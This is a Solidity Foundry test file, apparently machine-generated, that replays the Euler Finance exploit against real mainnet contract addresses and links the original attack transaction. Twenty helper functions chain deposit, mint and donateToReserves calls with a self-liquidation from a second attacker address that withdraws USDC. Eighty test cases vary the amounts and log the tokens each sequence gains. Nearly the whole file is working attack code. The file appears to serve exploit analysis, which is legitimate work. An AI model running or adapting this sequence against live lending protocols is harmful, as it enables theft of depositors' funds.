// SPDX-License-Identifier: MIT
pragma solidity >0.4.21;

// exploit: https://phalcon.xyz/tx/eth/0x465a6780145f1efe3ab52f94c006065575712d2003d83d85481f3d110ed131d9

import {DSTest} from "ds-test/test.sol";
import {Vm} from "forge-std/Vm.sol";
import {stdCheats} from "forge-std/stdlib.sol";
import {Strings} from "mylib/StringCon.sol";
import {Collect} from "mylib/Collect.sol";



interface IUSDC {
    function approve(address spender, uint256 value) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function burn(uint256 _amount) external;
    function configureMinter(address minter, uint256 minterAllowedAmount) external returns (bool);
    function decimals() external view returns (uint8);
    function masterMinter() external view returns (address);
    function mint(address _to, uint256 _amount) external returns (bool);
    function transfer(address to, uint256 value) external returns (bool);
}

interface IEToken {
    function burn(uint256 subAccountId, uint256 amount) external;
    function deposit(uint256 subAccountId, uint256 amount) external;
    function balanceOf(address account) external view returns (uint256);
    function donateToReserves(uint256 subAccountId, uint256 amount) external;
    function mint(uint256 subAccountId, uint256 amount) external;
    function touch() external;
    function withdraw(uint256 subAccountId, uint256 amount) external;
}

interface IEulerProtocol {
    function dispatch() external;
    function moduleIdToImplementation(uint256 moduleId) external view returns (address);
    function moduleIdToProxy(uint256 moduleId) external view returns (address);
    function name() external view returns (string memory);
}

interface IDToken {
    function balanceOf(address account) external view returns (uint256);
}


interface ILiquidation {
    function checkLiquidation(address liquidator, address violator, address underlying, address collateral)
        external
        returns (LiquidationOpportunity memory liqOpp);
    function liquidate(address violator, address underlying, address collateral, uint256 repay, uint256 minYield)
        external;
}

struct LiquidationOpportunity {
    uint256 repay;
    uint256 yield;
    uint256 healthScore;
    // Only populated if repay > 0:
    uint256 baseDiscount;
    uint256 discount;
    uint256 conversionRate;
}

contract euler is DSTest, stdCheats {
    Vm internal constant vm = Vm(HEVM_ADDRESS);
    Collect internal collect;
    address payable constant attacker = payable(address(uint160(uint256(keccak256(abi.encodePacked("attacker"))))));
    address payable constant attacker2 = payable(address(uint160(uint256(keccak256(abi.encodePacked("attacker2"))))));
    IUSDC internal constant USDC = IUSDC(address(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48));
    IEToken internal constant EToken = IEToken(address(0xbb0D4bb654a21054aF95456a3B29c63e8D1F4c0a));
    IEulerProtocol internal constant EulerProtocol = IEulerProtocol(address(0x27182842E098f60e3D576794A5bFFb0777E025d3));
    IEToken internal constant eUSDC = IEToken(address(0xEb91861f8A4e1C12333F42DCE8fB0Ecdc28dA716));
    IDToken internal constant dUSDC = IDToken(address(0x84721A3dB22EB852233AEAE74f9bC8477F8bcc42));
    ILiquidation internal constant Liquidation = ILiquidation(address(0xf43ce1d09050BAfd6980dD43Cde2aB9F18C85b34));
    uint256 repay; 
    uint256 yield;
    LiquidationOpportunity temp;
    
    function setUp() public {
        collect = new Collect();
        vm.label(attacker, "Attacker");
        address MasterMinter = USDC.masterMinter();
        vm.startPrank(MasterMinter);
        USDC.configureMinter(address(0x9BEF5148fD530244a14830f4984f2B76BCa0dC58), 2 ** 256 - 1);
        vm.stopPrank();
        startHoax(address(0x9BEF5148fD530244a14830f4984f2B76BCa0dC58));
        USDC.mint(address(attacker), 400000000e6);
        vm.stopPrank();

        // start to
        vm.startPrank(attacker);
        
        USDC.approve(address(EulerProtocol), type(uint256).max);
    }

            function helper0_(uint a, uint b, uint c, uint d) internal {        // Action: eulerDeposit
        eUSDC.deposit(0, a * 1e6);
        // Action: eulerDonate
        eUSDC.donateToReserves(0, b * 1e18);
        // Action: eulerMint
        eUSDC.mint(0, c * 1e6);
        // Action: eulerDonate
        eUSDC.donateToReserves(0, d * 1e18);
        // Collect: eulerLiquidateWithdraw
        uint _fsC0 = USDC.balanceOf(address(attacker));
        // Action: eulerLiquidateWithdraw
                vm.stopPrank();
        vm.startPrank(attacker2);
        temp = Liquidation.checkLiquidation(address(attacker2), address(attacker), address(USDC), address(USDC));
        repay = temp.repay;
        yield = temp.yield;
        Liquidation.liquidate(address(attacker), address(USDC), address(USDC), repay, yield);
        eUSDC.burn(0, type(uint).max);
        eUSDC.withdraw(0, type(uint).max);
        USDC.transfer(address(attacker), USDC.balanceOf(address(attacker2)));
        vm.stopPrank();
        vm.startPrank(attacker);
        collect.gained("USDC", USDC.balanceOf(address(attacker)) - _fsC0);
        collect.flush();
}   
                
            function helper1_(uint a, uint b, uint c, uint d) internal {        // Action: eulerDeposit
        eUSDC.deposit(0, a * 1e6);
        // Action: eulerDonate
        eUSDC.donateToReserves(0, b * 1e18);
        // Action: eulerMint
        eUSDC.mint(0, c * 1e6);
        // Collect: eulerDonate
        uint _fsC0 = eUSDC.balanceOf(address(attacker));
        // Action: eulerDonate
        eUSDC.donateToReserves(0, d * 1e18);
        collect.spent("eUSDC", _fsC0 - eUSDC.balanceOf(address(attacker)));
        collect.flush();
}   
                
            function helper2_(uint a, uint b, uint c) internal {        // Action: eulerDeposit
        eUSDC.deposit(0, a * 1e6);
        // Action: eulerDonate
        eUSDC.donateToReserves(0, b * 1e18);
        // Collect: eulerMint
        uint _fsC0 = eUSDC.balanceOf(address(attacker));
        // Action: eulerMint
        eUSDC.mint(0, c * 1e6);
        collect.gained("eUSDC", eUSDC.balanceOf(address(attacker)) - _fsC0);
        collect.flush();
}   
                
            function helper3_(uint a, uint b) internal {        // Action: eulerDeposit
        eUSDC.deposit(0, a * 1e6);
        // Collect: eulerDonate
        uint _fsC0 = eUSDC.balanceOf(address(attacker));
        // Action: eulerDonate
        eUSDC.donateToReserves(0, b * 1e18);
        collect.spent("eUSDC", _fsC0 - eUSDC.balanceOf(address(attacker)));
        collect.flush();
}   
                
            function helper4_(uint a) internal {        // Collect: eulerDeposit
        uint _fsC0 = eUSDC.balanceOf(address(attacker));
        // Action: eulerDeposit
        eUSDC.deposit(0, a * 1e6);
        collect.gained("eUSDC", eUSDC.balanceOf(address(attacker)) - _fsC0);
        collect.flush();
}   
                
            function helper5_(uint a, uint b, uint c, uint d) internal {        // Action: eulerDeposit
        eUSDC.deposit(0, a * 1e6);
        // Action: eulerMint
        eUSDC.mint(0, b * 1e6);
        // Action: eulerDonate
        eUSDC.donateToReserves(0, c * 1e18);
        // Action: eulerMint
        eUSDC.mint(0, d * 1e6);
        // Collect: eulerLiquidateWithdraw
        uint _fsC0 = USDC.balanceOf(address(attacker));
        // Action: eulerLiquidateWithdraw
                vm.stopPrank();
        vm.startPrank(attacker2);
        temp = Liquidation.checkLiquidation(address(attacker2), address(attacker), address(USDC), address(USDC));
        repay = temp.repay;
        yield = temp.yield;
        Liquidation.liquidate(address(attacker), address(USDC), address(USDC), repay, yield);
        eUSDC.burn(0, type(uint).max);
        eUSDC.withdraw(0, type(uint).max);
        USDC.transfer(address(attacker), USDC.balanceOf(address(attacker2)));
        vm.stopPrank();
        vm.startPrank(attacker);
        collect.gained("USDC", USDC.balanceOf(address(attacker)) - _fsC0);
        collect.flush();
}   
                
            function helper6_(uint a, uint b, uint c, uint d) internal {        // Action: eulerDeposit
        eUSDC.deposit(0, a * 1e6);
        // Action: eulerMint
        eUSDC.mint(0, b * 1e6);
        // Action: eulerDonate
        eUSDC.donateToReserves(0, c * 1e18);
        // Collect: eulerMint
        uint _fsC0 = eUSDC.balanceOf(address(attacker));
        // Action: eulerMint
        eUSDC.mint(0, d * 1e6);
        collect.gained("eUSDC", eUSDC.balanceOf(address(attacker)) - _fsC0);
        collect.flush();
}   
                
            function helper7_(uint a, uint b, uint c) internal {        // Action: eulerDeposit
        eUSDC.deposit(0, a * 1e6);
        // Action: eulerMint
        eUSDC.mint(0, b * 1e6);
        // Collect: eulerDonate
        uint _fsC0 = eUSDC.balanceOf(address(attacker));
        // Action: eulerDonate
        eUSDC.donateToReserves(0, c * 1e18);
        collect.spent("eUSDC", _fsC0 - eUSDC.balanceOf(address(attacker)));
        collect.flush();
}   
                
            function helper8_(uint a, uint b) internal {        // Action: eulerDeposit
        eUSDC.deposit(0, a * 1e6);
        // Collect: eulerMint
        uint _fsC0 = eUSDC.balanceOf(address(attacker));
        // Action: eulerMint
        eUSDC.mint(0, b * 1e6);
        collect.gained("eUSDC", eUSDC.balanceOf(address(attacker)) - _fsC0);
        collect.flush();
}   
                
            function helper9_(uint a) internal {        // Collect: eulerDeposit
        uint _fsC0 = eUSDC.balanceOf(address(attacker));
        // Action: eulerDeposit
        eUSDC.deposit(0, a * 1e6);
        collect.gained("eUSDC", eUSDC.balanceOf(address(attacker)) - _fsC0);
        collect.flush();
}   
                
            function helper10_(uint a, uint b, uint c, uint d) internal {        // Action: eulerDeposit
        eUSDC.deposit(0, a * 1e6);
        // Action: eulerMint
        eUSDC.mint(0, b * 1e6);
        // Action: eulerDonate
        eUSDC.donateToReserves(0, c * 1e18);
        // Action: eulerDeposit
        eUSDC.deposit(0, d * 1e6);
        // Collect: eulerLiquidateWithdraw
        uint _fsC0 = USDC.balanceOf(address(attacker));
        // Action: eulerLiquidateWithdraw
                vm.stopPrank();
        vm.startPrank(attacker2);
        temp = Liquidation.checkLiquidation(address(attacker2), address(attacker), address(USDC), address(USDC));
        repay = temp.repay;
        yield = temp.yield;
        Liquidation.liquidate(address(attacker), address(USDC), address(USDC), repay, yield);
        eUSDC.burn(0, type(uint).max);
        eUSDC.withdraw(0, type(uint).max);
        USDC.transfer(address(attacker), USDC.balanceOf(address(attacker2)));
        vm.stopPrank();
        vm.startPrank(attacker);
        collect.gained("USDC", USDC.balanceOf(address(attacker)) - _fsC0);
        collect.flush();
}   
                
            function helper11_(uint a, uint b, uint c, uint d) internal {        // Action: eulerDeposit
        eUSDC.deposit(0, a * 1e6);
        // Action: eulerMint
        eUSDC.mint(0, b * 1e6);
        // Action: eulerDonate
        eUSDC.donateToReserves(0, c * 1e18);
        // Collect: eulerDeposit
        uint _fsC0 = eUSDC.balanceOf(address(attacker));
        // Action: eulerDeposit
        eUSDC.deposit(0, d * 1e6);
        collect.gained("eUSDC", eUSDC.balanceOf(address(attacker)) - _fsC0);
        collect.flush();
}   
                
            function helper12_(uint a, uint b, uint c) internal {        // Action: eulerDeposit
        eUSDC.deposit(0, a * 1e6);
        // Action: eulerMint
        eUSDC.mint(0, b * 1e6);
        // Collect: eulerDonate
        uint _fsC0 = eUSDC.balanceOf(address(attacker));
        // Action: eulerDonate
        eUSDC.donateToReserves(0, c * 1e18);
        collect.spent("eUSDC", _fsC0 - eUSDC.balanceOf(address(attacker)));
        collect.flush();
}   
                
            function helper13_(uint a, uint b) internal {        // Action: eulerDeposit
        eUSDC.deposit(0, a * 1e6);
        // Collect: eulerMint
        uint _fsC0 = eUSDC.balanceOf(address(attacker));
        // Action: eulerMint
        eUSDC.mint(0, b * 1e6);
        collect.gained("eUSDC", eUSDC.balanceOf(address(attacker)) - _fsC0);
        collect.flush();
}   
                
            function helper14_(uint a) internal {        // Collect: eulerDeposit
        uint _fsC0 = eUSDC.balanceOf(address(attacker));
        // Action: eulerDeposit
        eUSDC.deposit(0, a * 1e6);
        collect.gained("eUSDC", eUSDC.balanceOf(address(attacker)) - _fsC0);
        collect.flush();
}   
                
            function helper15_(uint a, uint b, uint c, uint d) internal {        // Action: eulerDeposit
        eUSDC.deposit(0, a * 1e6);
        // Action: eulerMint
        eUSDC.mint(0, b * 1e6);
        // Action: eulerDeposit
        eUSDC.deposit(0, c * 1e6);
        // Action: eulerDonate
        eUSDC.donateToReserves(0, d * 1e18);
        // Collect: eulerLiquidateWithdraw
        uint _fsC0 = USDC.balanceOf(address(attacker));
        // Action: eulerLiquidateWithdraw
                vm.stopPrank();
        vm.startPrank(attacker2);
        temp = Liquidation.checkLiquidation(address(attacker2), address(attacker), address(USDC), address(USDC));
        repay = temp.repay;
        yield = temp.yield;
        Liquidation.liquidate(address(attacker), address(USDC), address(USDC), repay, yield);
        eUSDC.burn(0, type(uint).max);
        eUSDC.withdraw(0, type(uint).max);
        USDC.transfer(address(attacker), USDC.balanceOf(address(attacker2)));
        vm.stopPrank();
        vm.startPrank(attacker);
        collect.gained("USDC", USDC.balanceOf(address(attacker)) - _fsC0);
        collect.flush();
}   
                
            function helper16_(uint a, uint b, uint c, uint d) internal {        // Action: eulerDeposit
        eUSDC.deposit(0, a * 1e6);
        // Action: eulerMint
        eUSDC.mint(0, b * 1e6);
        // Action: eulerDeposit
        eUSDC.deposit(0, c * 1e6);
        // Collect: eulerDonate
        uint _fsC0 = eUSDC.balanceOf(address(attacker));
        // Action: eulerDonate
        eUSDC.donateToReserves(0, d * 1e18);
        collect.spent("eUSDC", _fsC0 - eUSDC.balanceOf(address(attacker)));
        collect.flush();
}   
                
            function helper17_(uint a, uint b, uint c) internal {        // Action: eulerDeposit
        eUSDC.deposit(0, a * 1e6);
        // Action: eulerMint
        eUSDC.mint(0, b * 1e6);
        // Collect: eulerDeposit
        uint _fsC0 = eUSDC.balanceOf(address(attacker));
        // Action: eulerDeposit
        eUSDC.deposit(0, c * 1e6);
        collect.gained("eUSDC", eUSDC.balanceOf(address(attacker)) - _fsC0);
        collect.flush();
}   
                
            function helper18_(uint a, uint b) internal {        // Action: eulerDeposit
        eUSDC.deposit(0, a * 1e6);
        // Collect: eulerMint
        uint _fsC0 = eUSDC.balanceOf(address(attacker));
        // Action: eulerMint
        eUSDC.mint(0, b * 1e6);
        collect.gained("eUSDC", eUSDC.balanceOf(address(attacker)) - _fsC0);
        collect.flush();
}   
                
            function helper19_(uint a) internal {        // Collect: eulerDeposit
        uint _fsC0 = eUSDC.balanceOf(address(attacker));
        // Action: eulerDeposit
        eUSDC.deposit(0, a * 1e6);
        collect.gained("eUSDC", eUSDC.balanceOf(address(attacker)) - _fsC0);
        collect.flush();
}   
                
    function testExample0_() public {
       helper0_(77587891, 40527344, 268066407, 145019532);
    }
        
    function testExample1_() public {
       helper0_(98388672, 1, 114746094, 1);
    }
        
    function testExample2_() public {
       helper1_(77587891, 40527344, 268066407, 145019532);
    }
        
    function testExample3_() public {
       helper1_(98388672, 1, 114746094, 1);
    }
        
    function testExample4_() public {
       helper2_(77587891, 40527344, 268066407);
    }
        
    function testExample5_() public {
       helper2_(98388672, 1, 114746094);
    }
        
    function testExample6_() public {
       helper3_(77587891, 40527344);
    }
        
    function testExample7_() public {
       helper3_(98388672, 1);
    }
        
    function testExample8_() public {
       helper4_(77587891);
    }
        
    function testExample9_() public {
       helper4_(98388672);
    }
        
    function testExample10_() public {
       helper5_(86295212, 1066831084, 1, 268834593);
    }
        
    function testExample11_() public {
       helper5_(112544819, 251663821, 1, 3567);
    }
        
    function testExample12_() public {
       helper5_(86122621, 1064697421, 1, 268296923);
    }
        
    function testExample13_() public {
       helper6_(86295212, 1066831084, 1, 268834593);
    }
        
    function testExample14_() public {
       helper6_(112544819, 251663821, 1, 3567);
    }
        
    function testExample15_() public {
       helper6_(86122621, 1064697421, 1, 268296923);
    }
        
    function testExample16_() public {
       helper7_(86295212, 1066831084, 1);
    }
        
    function testExample17_() public {
       helper7_(112544819, 251663821, 1);
    }
        
    function testExample18_() public {
       helper7_(86122621, 1064697421, 1);
    }
        
    function testExample19_() public {
       helper8_(86295212, 1066831084);
    }
        
    function testExample20_() public {
       helper8_(112544819, 251663821);
    }
        
    function testExample21_() public {
       helper8_(86122621, 1064697421);
    }
        
    function testExample22_() public {
       helper9_(86295212);
    }
        
    function testExample23_() public {
       helper9_(112544819);
    }
        
    function testExample24_() public {
       helper9_(86122621);
    }
        
    function testExample25_() public {
       helper10_(43713190, 68884800, 37642132, 16188101);
    }
        
    function testExample26_() public {
       helper10_(76281745, 783599766, 1, 91182363);
    }
        
    function testExample27_() public {
       helper10_(111756673, 2000000000, 1, 200000000);
    }
        
    function testExample28_() public {
       helper10_(185448309, 36132813, 1, 137150372);
    }
        
    function testExample29_() public {
       helper10_(76129181, 782032566, 1, 90999998);
    }
        
    function testExample30_() public {
       helper10_(111533159, 1996000000, 1, 199600000);
    }
        
    function testExample31_() public {
       helper11_(43713190, 68884800, 37642132, 16188101);
    }
        
    function testExample32_() public {
       helper11_(76281745, 783599766, 1, 91182363);
    }
        
    function testExample33_() public {
       helper11_(111756673, 2000000000, 1, 200000000);
    }
        
    function testExample34_() public {
       helper11_(185448309, 36132813, 1, 137150372);
    }
        
    function testExample35_() public {
       helper11_(76129181, 782032566, 1, 90999998);
    }
        
    function testExample36_() public {
       helper11_(111533159, 1996000000, 1, 199600000);
    }
        
    function testExample37_() public {
       helper12_(43713190, 68884800, 37642132);
    }
        
    function testExample38_() public {
       helper12_(76281745, 783599766, 1);
    }
        
    function testExample39_() public {
       helper12_(111756673, 2000000000, 1);
    }
        
    function testExample40_() public {
       helper12_(185448309, 36132813, 1);
    }
        
    function testExample41_() public {
       helper12_(76129181, 782032566, 1);
    }
        
    function testExample42_() public {
       helper12_(111533159, 1996000000, 1);
    }
        
    function testExample43_() public {
       helper13_(43713190, 68884800);
    }
        
    function testExample44_() public {
       helper13_(76281745, 783599766);
    }
        
    function testExample45_() public {
       helper13_(111756673, 2000000000);
    }
        
    function testExample46_() public {
       helper13_(185448309, 36132813);
    }
        
    function testExample47_() public {
       helper13_(76129181, 782032566);
    }
        
    function testExample48_() public {
       helper13_(111533159, 1996000000);
    }
        
    function testExample49_() public {
       helper14_(43713190);
    }
        
    function testExample50_() public {
       helper14_(76281745);
    }
        
    function testExample51_() public {
       helper14_(111756673);
    }
        
    function testExample52_() public {
       helper14_(185448309);
    }
        
    function testExample53_() public {
       helper14_(76129181);
    }
        
    function testExample54_() public {
       helper14_(111533159);
    }
        
    function testExample55_() public {
       helper15_(1, 1, 151941344, 1);
    }
        
    function testExample56_() public {
       helper15_(64325080, 1019587821, 137272602, 1);
    }
        
    function testExample57_() public {
       helper15_(123974609, 1783179472, 20075, 1);
    }
        
    function testExample58_() public {
       helper15_(64196429, 1017548645, 136998056, 1);
    }
        
    function testExample59_() public {
       helper15_(123726659, 1779613113, 20034, 1);
    }
        
    function testExample60_() public {
       helper16_(1, 1, 151941344, 1);
    }
        
    function testExample61_() public {
       helper16_(64325080, 1019587821, 137272602, 1);
    }
        
    function testExample62_() public {
       helper16_(123974609, 1783179472, 20075, 1);
    }
        
    function testExample63_() public {
       helper16_(64196429, 1017548645, 136998056, 1);
    }
        
    function testExample64_() public {
       helper16_(123726659, 1779613113, 20034, 1);
    }
        
    function testExample65_() public {
       helper17_(1, 1, 151941344);
    }
        
    function testExample66_() public {
       helper17_(64325080, 1019587821, 137272602);
    }
        
    function testExample67_() public {
       helper17_(123974609, 1783179472, 20075);
    }
        
    function testExample68_() public {
       helper17_(64196429, 1017548645, 136998056);
    }
        
    function testExample69_() public {
       helper17_(123726659, 1779613113, 20034);
    }
        
    function testExample70_() public {
       helper18_(1, 1);
    }
        
    function testExample71_() public {
       helper18_(64325080, 1019587821);
    }
        
    function testExample72_() public {
       helper18_(123974609, 1783179472);
    }
        
    function testExample73_() public {
       helper18_(64196429, 1017548645);
    }
        
    function testExample74_() public {
       helper18_(123726659, 1779613113);
    }
        
    function testExample75_() public {
       helper19_(1);
    }
        
    function testExample76_() public {
       helper19_(64325080);
    }
        
    function testExample77_() public {
       helper19_(123974609);
    }
        
    function testExample78_() public {
       helper19_(64196429);
    }
        
    function testExample79_() public {
       helper19_(123726659);
    }
        
}